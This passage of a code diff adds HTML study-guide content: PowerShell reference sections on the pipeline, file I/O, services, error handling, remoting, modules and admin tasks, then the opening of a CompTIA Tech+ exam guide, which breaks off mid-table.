+New-User -Name "Bob" -Role "User" -WhatIf    # Preview
+New-User -Name "Carol" -Role "Guest" -Verbose
+"Dave","Eve" | New-User -Role "User"         # Pipeline input
+
+# Filter function (process each pipeline item)
+filter Get-LargeFiles {
+    if ($_.Length -gt 1MB) { $_ }
+}
+Get-ChildItem -Recurse | Get-LargeFiles
+
+# Return values
+function Get-Double {
+    param ([int]$n)
+    return $n * 2   # return keyword optional — any unassigned output is returned
+}
+
+# Multiple return values (as array)
+function Get-MinMax {
+    param ([int[]]$numbers)
+    return @(
+        ($numbers | Measure-Object -Minimum).Minimum,
+        ($numbers | Measure-Object -Maximum).Maximum
+    )
+}
+$min, $max = Get-MinMax -numbers 3,1,4,1,5,9
+</code></pre>
+
+`,
+  "study-guide-powershell-10": `
+<h2>10. The Pipeline</h2>
+<pre><code># Pipeline passes objects, not text
+Get-Process | Where-Object { $_.CPU -gt 10 } | Sort-Object CPU -Descending | Select-Object -First 5
+
+# Pipeline aliases
+Where-Object  → where, ?
+ForEach-Object → foreach, %
+Select-Object  → select
+
+# Pipeline variables
+# $_ and $PSItem refer to the current pipeline object
+
+# Select properties
+Get-Process | Select-Object Name, CPU, WorkingSet
+Get-Process | Select-Object -Property Name, @{N="Memory(MB)"; E={[math]::Round($_.WorkingSet/1MB, 2)}}
+
+# Calculated properties
+Get-ChildItem | Select-Object Name, @{N="SizeMB"; E={[math]::Round($_.Length/1MB,2)}}
+
+# Where-Object filter methods
+Get-Process | Where-Object CPU -gt 10
+Get-Process | Where-Object -FilterScript { $_.Name -like "chrome*" -and $_.CPU -gt 5 }
+Get-Service | Where-Object Status -eq "Running"
+
+# Sort-Object
+Get-Process | Sort-Object CPU
+Get-Process | Sort-Object CPU -Descending
+Get-Process | Sort-Object @{E="Name"; A=$true}, @{E="CPU"; A=$false}
+
+# Group-Object
+Get-Process | Group-Object -Property Name
+Get-Service | Group-Object Status
+
+# Measure-Object
+Get-Process | Measure-Object CPU -Sum -Average -Maximum -Minimum
+Get-ChildItem -Recurse | Measure-Object -Property Length -Sum
+(Get-Content file.txt | Measure-Object -Line -Word -Character)
+
+# Compare-Object
+Compare-Object (Get-Content file1.txt) (Get-Content file2.txt)
+Compare-Object $baseline $current -Property Name
+
+# Tee-Object (send to file AND keep in pipeline)
+Get-Process | Tee-Object -FilePath "processes.txt" | Where-Object CPU -gt 10
+
+# Output formatting
+Get-Process | Format-Table Name, CPU, WorkingSet -AutoSize
+Get-Process | Format-List *
+Get-Service | Format-Wide Name -Column 4
+Get-Process | Out-GridView       # Pop-up grid (Windows GUI)
+Get-Process | Out-GridView -PassThru | Stop-Process  # Select in GUI, pipe result
+</code></pre>
+
+`,
+  "study-guide-powershell-11": `
+<h2>11. File System and I/O</h2>
+<pre><code># Navigation
+Get-Location            # pwd
+Set-Location "C:\\Users" # cd
+Push-Location "C:\\temp" # Save current, go to new
+Pop-Location            # Return to saved location
+Set-Location ~          # Home directory
+
+# File and directory operations
+Get-ChildItem                           # ls / dir
+Get-ChildItem -Recurse
+Get-ChildItem -Filter "*.ps1"
+Get-ChildItem -Include "*.txt","*.log" -Recurse
+Get-ChildItem -Exclude "*.tmp" -Recurse
+Get-ChildItem | Where-Object { !$_.PSIsContainer }    # Files only
+Get-ChildItem | Where-Object PSIsContainer            # Directories only
+
+New-Item -Path "folder" -ItemType Directory
+New-Item -Path "file.txt" -ItemType File
+New-Item -Path "file.txt" -ItemType File -Force       # Overwrite
+
+Copy-Item "source.txt" "dest.txt"
+Copy-Item "folder" "backup" -Recurse
+
+Move-Item "old.txt" "new.txt"
+Move-Item "file.txt" "C:\\backup\\"
+
+Rename-Item "old.txt" "new.txt"
+
+Remove-Item "file.txt"
+Remove-Item "folder" -Recurse
+Remove-Item "file.txt" -Force           # No confirmation
+Remove-Item *.tmp -WhatIf              # Preview what would be deleted
+
+Test-Path "file.txt"                    # True/False
+Test-Path "C:\\Users" -PathType Container  # Is it a directory?
+Test-Path "file.txt" -PathType Leaf      # Is it a file?
+
+Split-Path "C:\\Users\\Alice\\file.txt" -Parent    # "C:\\Users\\Alice"
+Split-Path "C:\\Users\\Alice\\file.txt" -Leaf      # "file.txt"
+Split-Path "C:\\Users\\Alice\\file.txt" -Extension # ".txt"  (PS 6+)
+Join-Path "C:\\Users" "Alice" "Documents"        # "C:\\Users\\Alice\\Documents"
+Resolve-Path "~\\Desktop\\*.txt"          # Expand wildcards/tilde
+[System.IO.Path]::GetTempFileName()
+
+# Reading files
+Get-Content "file.txt"                  # Returns string array (one element per line)
+Get-Content "file.txt" -Raw            # Entire file as single string
+Get-Content "file.txt" -TotalCount 10  # First 10 lines
+Get-Content "file.txt" -Tail 20        # Last 20 lines
+Get-Content "file.txt" -Wait           # tail -f equivalent
+Get-Content "large.bin" -Encoding Byte -ReadCount 1024  # Read binary
+
+# Writing files
+Set-Content "file.txt" "Hello, World!"         # Write (overwrite)
+Add-Content "file.txt" "New line"              # Append
+Out-File "output.txt"                          # From pipeline
+"Hello" | Out-File "file.txt" -Append
+"Hello" | Set-Content "file.txt" -Encoding UTF8
+
+# CSV
+Import-Csv "data.csv"
+Import-Csv "data.csv" -Delimiter ";"
+Export-Csv "output.csv" -NoTypeInformation
+$objects | Export-Csv "output.csv" -NoTypeInformation -Append
+
+# JSON (PS 3+)
+$data = Get-Content "data.json" -Raw | ConvertFrom-Json
+$json = $object | ConvertTo-Json -Depth 10
+$json | Set-Content "output.json"
+
+# XML
+[xml]$doc = Get-Content "config.xml"
+$doc.SelectNodes("//server")
+$doc.configuration.settings.key
+$doc.Save("config.xml")
+
+# Invoke-WebRequest
+$response = Invoke-WebRequest -Uri "https://api.example.com/data"
+$response.StatusCode
+$response.Content
+$response.Headers
+$data = $response.Content | ConvertFrom-Json
+
+Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"
+</code></pre>
+
+`,
+  "study-guide-powershell-12": `
+<h2>12. Process and Service Management</h2>
+<pre><code># Processes
+Get-Process
+Get-Process -Name "chrome"
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
+Get-Process | Where-Object { $_.WorkingSet -gt 100MB }
+
+Start-Process "notepad.exe"
+Start-Process "cmd.exe" -ArgumentList "/c dir" -Wait -NoNewWindow
+Start-Process "program.exe" -Credential $cred -RunAs
+Start-Process "powershell.exe" -Verb RunAs  # Elevated
+
+Stop-Process -Name "notepad"
+Stop-Process -Id 1234
+Stop-Process -Name "chrome" -Force
+
+Wait-Process -Name "setup" -Timeout 300
+
+# Services
+Get-Service
+Get-Service -Name "wuauserv"
+Get-Service | Where-Object Status -eq "Running"
+Get-Service | Where-Object StartType -eq "Automatic"
+
+Start-Service -Name "Spooler"
+Stop-Service  -Name "Spooler"
+Restart-Service -Name "Spooler" -Force
+Suspend-Service -Name "Spooler"
+Resume-Service  -Name "Spooler"
+
+Set-Service -Name "Spooler" -StartupType Automatic
+Set-Service -Name "Spooler" -Status Running -Description "Print Spooler"
+
+New-Service -Name "MyService" -BinaryPathName "C:\\MyApp\\service.exe"
+Remove-Service -Name "MyService"  # PS 6+
+</code></pre>
+
+`,
+  "study-guide-powershell-13": `
+<h2>13. Error Handling</h2>
+<pre><code># $ErrorActionPreference
+$ErrorActionPreference = "Stop"     # All errors become terminating
+$ErrorActionPreference = "Continue" # Default: display and continue
+$ErrorActionPreference = "SilentlyContinue"  # Suppress errors
+$ErrorActionPreference = "Inquire"  # Ask user each time
+
+# -ErrorAction parameter (per command)
+Get-Item "missing.txt" -ErrorAction SilentlyContinue
+Get-Item "missing.txt" -ErrorAction Stop
+
+# -ErrorVariable (capture errors)
+Get-Item "missing.txt" -ErrorAction SilentlyContinue -ErrorVariable myError
+$myError.Exception.Message
+
+# try/catch/finally
+try {
+    $result = 10 / 0
+    Get-Item "C:\\nonexistent" -ErrorAction Stop
+} catch [System.DivideByZeroException] {
+    Write-Error "Division by zero!"
+} catch [System.IO.FileNotFoundException] {
+    Write-Warning "File not found"
+} catch {
+    # Catch all other exceptions
+    Write-Error "Unexpected error: $_"
+    Write-Error $_.Exception.Message
+    Write-Error $_.Exception.GetType().FullName
+    Write-Error $_.ScriptStackTrace
+} finally {
+    Write-Output "Cleanup"
+}
+
+# Throw custom errors
+throw "Something went wrong"
+throw [System.ArgumentException]::new("Invalid argument")
+
+# $Error automatic variable
+$Error                          # All recent errors
+$Error[0]                       # Most recent
+$Error.Clear()                  # Clear error list
+
+# Checking command success
+if ($?) { "Last command succeeded" }
+$LASTEXITCODE                   # Exit code of native exe
+</code></pre>
+
+`,
+  "study-guide-powershell-14": `
+<h2>14. Remoting</h2>
+<pre><code># Enable remoting (run as admin)
+Enable-PSRemoting -Force
+
+# One-to-one interactive session
+Enter-PSSession -ComputerName "Server01"
+Enter-PSSession -ComputerName "Server01" -Credential (Get-Credential)
+Exit-PSSession
+
+# One-to-many (invoke commands on multiple machines)
+Invoke-Command -ComputerName "Server01","Server02" -ScriptBlock {
+    Get-Process
+    Restart-Service "Spooler"
+}
+
+Invoke-Command -ComputerName $servers -ScriptBlock {
+    param($serviceName)
+    Get-Service -Name $serviceName
+} -ArgumentList "Spooler"
+
+# Persistent sessions
+$session = New-PSSession -ComputerName "Server01"
+Invoke-Command -Session $session -ScriptBlock { whoami }
+Enter-PSSession -Session $session
+Remove-PSSession -Session $session
+
+# Import remote module
+Import-PSSession -Session $session -Module ActiveDirectory
+
+# Copy files over remoting
+Copy-Item -Path "C:\\local\\file.txt" -Destination "C:\\remote\\" -ToSession $session
+
+# SSH-based remoting (PS 7+, cross-platform)
+Enter-PSSession -HostName "linux-server" -UserName "alice"
+Invoke-Command -HostName "linux-server" -UserName "alice" -ScriptBlock { ls /etc }
+</code></pre>
+
+`,
+  "study-guide-powershell-15": `
+<h2>15. Modules and Scripts</h2>
+<pre><code># Modules
+Get-Module                           # Loaded modules
+Get-Module -ListAvailable            # All installed modules
+Import-Module ActiveDirectory
+Import-Module ActiveDirectory -Force # Reload
+Remove-Module ActiveDirectory
+Find-Module -Name "Pester"           # Search PowerShell Gallery
+Install-Module -Name "Pester"        # Install from Gallery
+Update-Module -Name "Pester"
+Uninstall-Module -Name "Pester"
+
+# Script structure (script.ps1)
+#Requires -Version 7.0
+#Requires -Modules ActiveDirectory
+#Requires -RunAsAdministrator
+
+[CmdletBinding()]
+param (
+    [Parameter(Mandatory)]
+    [string]$Target,
+    [switch]$Verbose
+)
+
+# Dot-sourcing (load functions into current scope)
+. .\\functions.ps1
+. "$PSScriptRoot\\helpers.ps1"
+
+# Invoke as new scope
+&amp; .\\script.ps1
+
+# Script signing
+$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert
+Set-AuthenticodeSignature -FilePath "script.ps1" -Certificate $cert
+
+# Creating a module (myModule.psm1)
+function Get-MyData {
+    param([string]$query)
+    # ...
+}
+
+Export-ModuleMember -Function "Get-MyData"   # Public
+# Functions without Export are private
+
+# Module manifest (myModule.psd1)
+New-ModuleManifest -Path "myModule.psd1" \`
+    -RootModule "myModule.psm1" \`
+    -Author "Alice" \`
+    -Description "My module" \`
+    -FunctionsToExport @("Get-MyData")
+</code></pre>
+
+`,
+  "study-guide-powershell-16": `
+<h2>16. Common Administrative Tasks</h2>
+<pre><code># Registry
+Get-Item "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
+Get-ItemProperty "HKLM:\\SOFTWARE\\..." -Name "ProgramFilesDir"
+Set-ItemProperty "HKCU:\\Software\\MyApp" -Name "Setting" -Value "Value"
+New-Item "HKCU:\\Software\\MyApp"
+Remove-Item "HKCU:\\Software\\MyApp" -Recurse
+
+# Event log
+Get-EventLog -LogName System -Newest 20
+Get-EventLog -LogName System -EntryType Error -Newest 10
+Get-EventLog -LogName Application -Source "MSSQLSERVER"
+Get-WinEvent -LogName System -MaxEvents 50     # Newer, more powerful
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624}  # Logins
+
+# Network
+Test-NetConnection -ComputerName "google.com"
+Test-NetConnection -ComputerName "server" -Port 443
+Test-Connection -TargetName "8.8.8.8" -Count 4
+Get-NetAdapter
+Get-NetIPAddress
+Get-NetIPConfiguration
+Resolve-DnsName "example.com"
+Get-NetTCPConnection | Where-Object State -eq "Established"
+
+# Scheduled tasks
+Get-ScheduledTask
+Get-ScheduledTask -TaskName "WindowsUpdate"
+Start-ScheduledTask -TaskName "MyTask"
+Enable-ScheduledTask -TaskName "MyTask"
+Disable-ScheduledTask -TaskName "MyTask"
+
+$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\\script.ps1"
+$trigger = New-ScheduledTaskTrigger -Daily -At "2:00 AM"
+$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable
+Register-ScheduledTask -TaskName "MyTask" -Action $action -Trigger $trigger -Settings $settings
+
+# Windows Management Instrumentation (WMI)
+Get-WmiObject -Class Win32_ComputerSystem
+Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
+Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, @{N="FreeGB"; E={[math]::Round($_.FreeSpace/1GB,2)}}
+Get-WmiObject -Class Win32_Process | Where-Object Name -eq "notepad.exe"
+
+# CIM (modern WMI)
+Get-CimInstance -ClassName Win32_ComputerSystem
+Get-CimInstance -ClassName Win32_Service | Where-Object State -eq "Running"
+</code></pre>
+
+`,
+  "study-guide-powershell-17": `
+<h2>17. PowerShell Interview Questions</h2>
+<p><strong>Q: What is the PowerShell pipeline and what makes it different from bash?</strong>
+A: PowerShell pipes <strong>.NET objects</strong> between commands, not text. This means downstream commands can access properties and methods without parsing strings. Bash pipes raw text that must be parsed.</p>
+<p><strong>Q: What is the difference between <code>Write-Output</code>, <code>Write-Host</code>, and <code>Write-Verbose</code>?</strong>
+A: <code>Write-Output</code> puts objects into the pipeline (can be captured/redirected). <code>Write-Host</code> writes directly to the console (bypasses pipeline). <code>Write-Verbose</code> writes to the Verbose stream (only shown when <code>-Verbose</code> flag is used or <code>$VerbosePreference = "Continue"</code>).</p>
+<p><strong>Q: What is splatting?</strong>
+A: Passing parameters as a hashtable using <code>@</code> instead of <code>$</code>. Useful for long parameter lists and conditional parameters: <code>$params = @{Name="x"}; Get-Process @params</code>.</p>
+<p><strong>Q: What does <code>$_</code> mean?</strong>
+A: The current pipeline object, also accessible as <code>$PSItem</code>. Inside <code>ForEach-Object</code>, <code>Where-Object</code>, or script blocks in the pipeline, <code>$_</code> refers to each incoming object.</p>
+<p><strong>Q: What is the difference between <code>=</code> and <code>-eq</code>?</strong>
+A: <code>=</code> is assignment. <code>-eq</code> is comparison (equal to). PowerShell uses word-based comparison operators (<code>-eq</code>, <code>-ne</code>, <code>-lt</code>, <code>-gt</code>, <code>-like</code>, <code>-match</code>) instead of symbols.</p>
+<p><strong>Q: What is the <code>[CmdletBinding()]</code> attribute?</strong>
+A: Turns a function into an advanced function, adding support for <code>-Verbose</code>, <code>-Debug</code>, <code>-WhatIf</code>, <code>-Confirm</code>, <code>-ErrorAction</code>, and other common parameters automatically.</p>
+
+<p><em>End of PowerShell Study Guide</em></p>
+
+`,
+  "study-guide-techplus-01": `
+<h2>1. Exam Overview</h2>
+<p><strong>Exam Code:</strong> FC0-U71<br/><strong>Exam Name:</strong> CompTIA Tech+<br/><strong>Questions:</strong> 75 multiple-choice<br/><strong>Time Limit:</strong> 60 minutes<br/><strong>Passing Score:</strong> 650 (on a 100–900 scale)<br/><strong>Recommended Experience:</strong> No prerequisites (entry-level)</p>
+<h3>Domain Breakdown</h3>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Weight</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. IT Concepts and Terminology</td>
+<td>17%</td>
+</tr>
+<tr>
+<td>2. Infrastructure</td>
+<td>22%</td>
+</tr>
+<tr>
+<td>3. Applications and Software</td>
+<td>18%</td>
+</tr>
+<tr>
+<td>4. Software Development Concepts</td>
+<td>12%</td>
+</tr>
+<tr>
+<td>5. Database Fundamentals</td>
+<td>11%</td>
+</tr>
+<tr>
+<td>6. Security</td>
+<td>20%</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-techplus-02": `
+<h2>2. Domain 1: IT Concepts and Terminology</h2>
+<h3>Notational Systems</h3>
+<table>
+<thead>
+<tr>
+<th>System</th>
+<th>Base</th>
+<th>Digits</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Binary</td>
+<td>2</td>
+<td>0–1</td>
+<td>How computers store data</td>
+</tr>
+<tr>
+<td>Octal</td>
+<td>8</td>
+<td>0–7</td>
+<td>File permissions (Unix)</td>
+</tr>
+<tr>
+<td>Decimal</td>
+<td>10</td>
+<td>0–9</td>
+<td>Human-readable numbers</td>
+</tr>
+<tr>
+<td>Hexadecimal</td>
+<td>16</td>
+<td>0–F</td>
+<td>Memory addresses, colors</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Converting decimal to binary:</strong></p>
+<ul>
+<li>42 ÷ 2 = 21 R 0 → Read remainders bottom-up</li>
+<li>21 ÷ 2 = 10 R 1</li>
+<li>10 ÷ 2 = 5  R 0</li>
+<li>5  ÷ 2 = 2  R 1</li>
+<li>2  ÷ 2 = 1  R 0</li>
+<li>1  ÷ 2 = 0  R 1</li>
+<li><strong>42 = 101010 in binary</strong></li>
+</ul>
+<p><strong>Hex shortcuts:</strong> 1 hex digit = 4 binary bits. FF = 11111111 = 255 decimal.</p>
+<h3>Data Storage Units</h3>
+<table>
+<thead>
+<tr>
+<th>Unit</th>
+<th>Bytes</th>
+<th>Approximate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Bit (b)</td>
+<td>1/8</td>
+<td>Single 0 or 1</td>
+</tr>
+<tr>
+<td>Byte (B)</td>
+<td>1</td>
+<td>One character</td>
+</tr>
+<tr>
+<td>Kilobyte (KB)</td>
+<td>1,024</td>
+<td>Short document</td>
+</tr>
+<tr>
+<td>Megabyte (MB)</td>
+<td>1,048,576</td>
+<td>MP3 song</td>
+</tr>
+<tr>
+<td>Gigabyte (GB)</td>
+<td>1,073,741,824</td>
+<td>HD movie</td>
+</tr>
+<tr>
+<td>Terabyte (TB)</td>
+<td>~1 trillion</td>
+<td>Large HDD</td>
+</tr>
+<tr>
+<td>Petabyte (PB)</td>
+<td>~1 quadrillion</td>
+<td>Data center</td>
+</tr>
+</tbody>
+</table>
+<h3>CPU Architecture</h3>
+<ul>
+<li><strong>CPU (Central Processing Unit):</strong> Executes instructions; the "brain"</li>
+<li><strong>Cores:</strong> Independent execution units in one chip (dual-core, quad-core, octa-core)</li>
+<li><strong>Clock Speed:</strong> GHz = operations per second; higher = faster</li>
+<li><strong>Cache:</strong> L1 (fastest/smallest) → L2 → L3 (largest/slowest)</li>
+<li><strong>32-bit vs 64-bit:</strong> 64-bit can address more RAM (&gt;4GB) and is standard today</li>
+<li><strong>x86 / x64:</strong> Intel/AMD instruction set architectures</li>
+<li><strong>ARM:</strong> Low-power architecture (mobile, embedded, Apple Silicon)</li>
+</ul>
+<h3>Memory Types</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Volatile</th>
+<th>Speed</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Register</td>
+<td>Yes</td>
+<td>Fastest</td>
+<td>CPU calculations</td>
+</tr>
+<tr>
+<td>L1/L2/L3 Cache</td>
+<td>Yes</td>
+<td>Very Fast</td>
+<td>Recently used data</td>
+</tr>
+<tr>
+<td>RAM (DRAM)</td>
+<td>Yes</td>
+<td>Fast</td>
+<td>Active programs</td>
+</tr>
+<tr>
+<td>Virtual Memory</td>
+<td>N/A</td>
+<td>Slow</td>
+<td>RAM overflow (uses HDD)</td>
+</tr>
+<tr>
+<td>ROM</td>
+<td>No</td>
+<td>Fast</td>
+<td>Firmware/BIOS</td>
+</tr>
+<tr>
+<td>Flash</td>
+<td>No</td>
+<td>Medium</td>
+<td>SSDs, USB drives</td>
+</tr>
+<tr>
+<td>HDD</td>
+<td>No</td>
+<td>Slow</td>
+<td>Long-term storage</td>
+</tr>
+</tbody>
+</table>
+<p><strong>RAM Types:</strong></p>
+<ul>
+<li><strong>DDR4, DDR5:</strong> Current standard (Double Data Rate)</li>
+<li><strong>DIMM:</strong> Desktop RAM form factor</li>
+<li><strong>SO-DIMM:</strong> Laptop RAM form factor</li>
+<li><strong>ECC RAM:</strong> Error-correcting (servers)</li>
+</ul>
+<h3>Input/Output Devices</h3>
+<p><strong>Input:</strong> Keyboard, mouse, scanner, webcam, microphone, stylus, barcode reader, biometric reader, touchscreen<br/><strong>Output:</strong> Monitor, printer, speaker, projector<br/><strong>Input/Output:</strong> Touchscreen, headset, external storage</p>
+<h3>Connectivity Types</h3>
+<table>
+<thead>
+<tr>
+<th>Interface</th>
+<th>Speed</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>USB 2.0</td>
+<td>480 Mbps</td>
+<td>Common peripherals</td>
+</tr>
+<tr>
+<td>USB 3.0 (blue)</td>
+<td>5 Gbps</td>
+<td>Fast storage</td>
+</tr>
+<tr>
+<td>USB 3.1</td>
+<td>10 Gbps</td>
+<td>External drives</td>
+</tr>
+<tr>
+<td>USB 3.2</td>
+<td>20 Gbps</td>
+<td>Fast external SSDs</td>
+</tr>
+<tr>
+<td>USB4</td>
+<td>40 Gbps</td>
+<td>Thunderbolt-compatible</td>
+</tr>
+<tr>
+<td>Thunderbolt 3/4</td>
+<td>40 Gbps</td>
+<td>Docking stations, 4K</td>
+</tr>
+<tr>
+<td>HDMI</td>
+<td>Video</td>
+<td>Displays, TVs</td>
+</tr>
+<tr>
+<td>DisplayPort</td>
+<td>Video</td>
+<td>Monitors (supports daisy-chain)</td>
+</tr>
+<tr>
+<td>USB-C</td>
+<td>Power + data + video</td>
+<td>Universal connector</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-techplus-03": `
+<h2>3. Domain 2: Infrastructure</h2>
+<h3>Motherboard and Components</h3>
+<ul>
+<li><strong>Motherboard:</strong> Main circuit board connecting all components</li>
+<li><strong>Chipset:</strong> Controls communication between CPU, RAM, storage</li>
+<li><strong>PCIe Slots:</strong> Expansion cards (GPU, NIC, SSD)</li>
+<li><strong>SATA Ports:</strong> Hard drives and optical drives</li>
+<li><strong>M.2 Slot:</strong> NVMe SSDs (very fast, small form factor)</li>
+<li><strong>BIOS/UEFI:</strong> Firmware that initializes hardware at startup<ul>
+<li>BIOS: Legacy; UEFI: Modern (supports GPT, Secure Boot, faster)</li>
+</ul>
+</li>
+<li><strong>CMOS Battery:</strong> Keeps BIOS settings when power is off</li>
+</ul>
+<h3>Storage Technologies</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Technology</th>
+<th>Speed</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HDD</td>
+<td>Magnetic spinning disk</td>
+<td>Slow (~100 MB/s)</td>
+<td>High capacity, cheap</td>
+</tr>
+<tr>
+<td>SSD (SATA)</td>
+<td>Flash memory</td>
+<td>Faster (~500 MB/s)</td>
+<td>Replaces HDD</td>
+</tr>
+<tr>
+<td>NVMe SSD</td>
+<td>Flash via PCIe</td>
+<td>Fastest (~3-7 GB/s)</td>
+<td>Gaming, workstations</td>
+</tr>
+<tr>
+<td>Optical</td>
+<td>Laser (CD/DVD/Blu-ray)</td>
+<td>Very slow</td>
+<td>Media, archiving</td>
+</tr>
+<tr>
+<td>USB Flash</td>
+<td>NAND flash</td>
+<td>Varies</td>
+<td>Portable</td>
+</tr>
+<tr>
+<td>SD Card</td>
+<td>NAND flash</td>
+<td>Varies</td>
+<td>Cameras, mobile</td>
+</tr>
+</tbody>
+</table>
+<p><strong>RAID (Redundant Array of Independent Disks):</strong></p>
+<table>
+<thead>
+<tr>
+<th>RAID</th>
+<th>Min Drives</th>
+<th>Benefit</th>
+<th>Loss</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RAID 0 (Striping)</td>
+<td>2</td>
+<td>Speed</td>
+<td>No redundancy</td>
+</tr>
+<tr>
+<td>RAID 1 (Mirroring)</td>
+<td>2</td>
+<td>Redundancy</td>
+<td>50% capacity</td>
+</tr>
+<tr>
+<td>RAID 5</td>
+<td>3</td>
+<td>Balance</td>
+<td>1 drive</td>
+</tr>
+<tr>
+<td>RAID 6</td>
+<td>4</td>
+<td>More redundant</td>
+<td>2 drives</td>
+</tr>
+<tr>
+<td>RAID 10</td>
+<td>4</td>
+<td>Speed + redundancy</td>
+<td>50% capacity</td>
+</tr>
+</tbody>
+</table>
+<h3>Networking Hardware</h3>
+<ul>
+<li><strong>Router:</strong> Connects networks; routes packets between them; assigns IPs</li>
+<li><strong>Switch:</strong> Connects devices within a LAN; works at Layer 2 (MAC addresses)</li>
+<li><strong>Hub:</strong> Old/dumb; broadcasts to all ports (avoid)</li>
+<li><strong>Access Point (AP):</strong> Wireless radio for Wi-Fi devices</li>
+<li><strong>Modem:</strong> Converts digital ↔ analog (DSL/cable/fiber)</li>
+<li><strong>Firewall:</strong> Controls traffic based on rules</li>
+<li><strong>NIC (Network Interface Card):</strong> Device's network connection</li>
+<li><strong>Patch Panel:</strong> Organized wiring distribution</li>
+</ul>
+<h3>Network Types and Topologies</h3>
+<table>
+<thead>
+<tr>
+<th>Network Type</th>
+<th>Coverage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PAN</td>
+<td>Personal (~10 feet, Bluetooth)</td>
+</tr>
+<tr>
+<td>LAN</td>
+<td>Local Area (building/campus)</td>
+</tr>
+<tr>
+<td>MAN</td>
+<td>Metropolitan Area (city)</td>
+</tr>
+<tr>
+<td>WAN</td>
+<td>Wide Area (country/world)</td>
+</tr>
+<tr>
+<td>WLAN</td>
+<td>Wireless LAN</td>
+</tr>
+<tr>
+<td>VPN</td>
+<td>Virtual Private Network (secure tunnel)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Topologies:</strong></p>
+<ul>
+<li><strong>Bus:</strong> All on one cable; failure breaks network</li>
+<li><strong>Ring:</strong> Circle; traffic flows one direction</li>
+<li><strong>Star:</strong> All connect to central switch (most common today)</li>
+<li><strong>Mesh:</strong> Every device connected to every other (high redundancy)</li>
+<li><strong>Hybrid:</strong> Mix of topologies</li>
+</ul>
+<h3>Cloud Computing</h3>
+<p><strong>Service Models:</strong></p>
+<ul>
+<li><strong>IaaS (Infrastructure as a Service):</strong> Virtual machines, storage (AWS EC2, Azure VMs)</li>
+<li><strong>PaaS (Platform as a Service):</strong> Development platform (Google App Engine, Heroku)</li>
+<li><strong>SaaS (Software as a Service):</strong> Ready-to-use apps (Gmail, Salesforce, Office 365)</li>
+</ul>
+<p><strong>Deployment Models:</strong></p>
+<ul>
+<li><strong>Public:</strong> Shared infrastructure (AWS, Azure, GCP)</li>
+<li><strong>Private:</strong> Dedicated to one organization</li>
+<li><strong>Hybrid:</strong> Mix of public and private</li>
+<li><strong>Community:</strong> Shared by several organizations with similar needs</li>
+</ul>
+<p><strong>Cloud Benefits:</strong></p>
+<ul>
+<li>Scalability / Elasticity</li>
+<li>Pay-as-you-go (CapEx → OpEx)</li>
+<li>High availability</li>
+<li>Geographic redundancy</li>
+<li>No hardware maintenance</li>
+</ul>
+<h3>Virtualization</h3>
+<ul>
+<li><strong>Hypervisor:</strong> Software that creates and manages VMs<ul>
+<li><strong>Type 1 (Bare-metal):</strong> Runs on hardware directly (VMware ESXi, Hyper-V Server, KVM)</li>
+<li><strong>Type 2 (Hosted):</strong> Runs on top of OS (VMware Workstation, VirtualBox)</li>
+</ul>
+</li>
+<li><strong>VM (Virtual Machine):</strong> Emulates complete computer</li>
+<li><strong>Container:</strong> Lightweight VM; shares OS kernel (Docker)</li>
+<li><strong>Snapshot:</strong> Point-in-time copy of VM state</li>
+</ul>
+
+`,
+  "study-guide-techplus-04": `
+<h2>4. Domain 3: Applications and Software</h2>
+<h3>Operating Systems</h3>
+<p><strong>Functions of an OS:</strong></p>
+<ul>
+<li>Process management (CPU scheduling)</li>
+<li>Memory management (RAM allocation)</li>
+<li>File system management</li>
+<li>Device management (drivers)</li>
+<li>User interface (CLI or GUI)</li>
+<li>Security and access control</li>
+</ul>
+<p><strong>Major OS Families:</strong></p>
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Kernel</th>
+<th>GUI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows 11</td>
+<td>Windows NT</td>
+<td>Explorer (shell)</td>
+</tr>
+<tr>
+<td>macOS</td>
+<td>XNU (Darwin)</td>
+<td>Aqua</td>
+</tr>
+<tr>
+<td>Ubuntu Linux</td>
+<td>Linux kernel</td>
+<td>GNOME/KDE</td>
+</tr>
+<tr>
+<td>Android</td>
+<td>Linux kernel</td>
+<td>Custom</td>
+</tr>
+<tr>
+<td>iOS</td>
+<td>XNU</td>
+<td>SpringBoard</td>
+</tr>
+<tr>
+<td>Chrome OS</td>
+<td>Linux kernel</td>
+<td>Chrome</td>
+</tr>
+</tbody>
+</table>
+<p><strong>File Systems:</strong></p>
+<table>
+<thead>
+<tr>
+<th>File System</th>
+<th>OS</th>
+<th>Max File Size</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NTFS</td>
+<td>Windows</td>
+<td>16 EB</td>
+<td>Journaling, encryption</td>
+</tr>
+<tr>
+<td>FAT32</td>
+<td>Universal</td>
+<td>4 GB</td>
+<td>Cross-platform, old</td>
+</tr>
+<tr>
+<td>exFAT</td>
+<td>Universal</td>
+<td>16 EB</td>
+<td>USB drives, Flash</td>
+</tr>
+<tr>
+<td>ext4</td>
+<td>Linux</td>
+<td>16 TB</td>
